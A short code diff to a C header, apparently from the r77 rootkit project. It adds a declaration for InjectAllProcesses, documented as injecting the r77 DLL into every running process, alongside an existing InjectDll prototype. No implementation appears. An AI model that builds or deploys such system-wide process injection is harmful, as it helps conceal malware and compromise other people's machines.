@@ -36,6 +36,18 @@ typedef struct _R77_PROCESS
 /// otherwise, FALSE.
 /// </returns>
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize);
+/// <summary>
+/// Injects all processes with the r77 DLL.
+/// </summary>
+/// <param name="dll32">The r77-x86.dll file.</param>
+/// <param name="dll32Size">The size of the r77-x86.dll file.</param>
+/// <param name="dll64">The r77-x64.dll file.</param>
+/// <param name="dll64Size">The size of the r77-x64.dll file.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL InjectAllProcesses(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size);
 
 /// <summary>
 /// Retrieves a list of all processes where an r77 header is present.
